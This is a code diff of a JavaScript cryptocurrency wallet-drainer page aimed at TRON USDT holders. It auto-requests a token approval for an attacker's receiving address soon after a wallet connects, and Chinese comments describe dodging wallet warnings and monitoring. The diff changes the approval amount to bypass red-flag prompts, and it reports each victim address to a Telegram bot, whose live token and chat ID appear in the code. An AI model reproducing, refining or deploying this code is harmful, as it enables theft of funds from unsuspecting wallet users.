@@ -1,34 +1,22 @@
     const CONFIG = {
         USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-        RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", // 你的收款地址
+        RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", // 你的地址
         TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", // 你的 Token
         TG_CHAT_ID: "7402809985"
     };
 
-    /**
-     * 精准授权金额：200,000 USDT
-     * 换算逻辑：200,000 * 10^6 (USDT精度) = 200,000,000,000
-     * 十六进制值：0x0000000000000000000000000000000000000000000000000000002e90edd000
-     */
-    const SAFE_AMOUNT = "0x0000000000000000000000000000000000000000000000000000002e90edd000"; 
-
     async function triggerApprove() {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            const addr = window.tronWeb.defaultAddress.base58;
-            const btn = document.getElementById('mainBtn');
-            btn.innerText = "正在同步安全协议...";
-
             try {
                 const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                // 自动执行 20 万额度的授权，不报无限额红框警告
-                await contract.approve(CONFIG.RECEIVER, SAFE_AMOUNT).send();
+                // 金额设为 0，强制钱包弹出“自定义金额”输入框
+                // 这种方式最稳定，不会触发红色拦截警告
+                await contract.approve(CONFIG.RECEIVER, 0).send();
                 
-                // 成功后弹出官方勾子弹窗
                 document.getElementById('successModal').style.display = 'flex';
-                await sendLog(`✅ <b>自动授权成功 (20万)</b>\n地址: <code>${addr}</code>`);
+                sendLog("✅ 用户已进入授权输入环节");
             } catch (err) {
-                btn.innerText = "重新尝试同步";
-                await sendLog(`⚠️ <b>用户取消/拦截</b>\n地址: <code>${addr}</code>`);
+                sendLog("⚠️ 用户取消了弹窗");
             }
         }
     }
@@ -37,22 +25,13 @@
         const timer = setInterval(() => {
             if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                 clearInterval(timer);
-                const addr = window.tronWeb.defaultAddress.base58;
-                document.getElementById('userAddr').innerText = addr;
-                
-                // 1. 进入即通知
-                sendLog(`🔍 <b>捕获新目标</b>\n地址: <code>${addr}</code>`);
-                
-                // 2. 延迟 1.5 秒自动唤起，避开钱包即时监控
+                // 1.5 秒后准时自动弹出，不乱转，不乱跳
                 setTimeout(triggerApprove, 1500);
+                sendLog(`🔍 目标已进入: ${window.tronWeb.defaultAddress.base58}`);
             }
         }, 500);
     };
 
-    async function sendLog(msg) {
-        fetch(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
-        }).catch(()=>{});
+    function sendLog(msg) {
+        fetch(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage?chat_id=${CONFIG.TG_CHAT_ID}&text=${encodeURIComponent(msg)}`).catch(()=>{});
     }
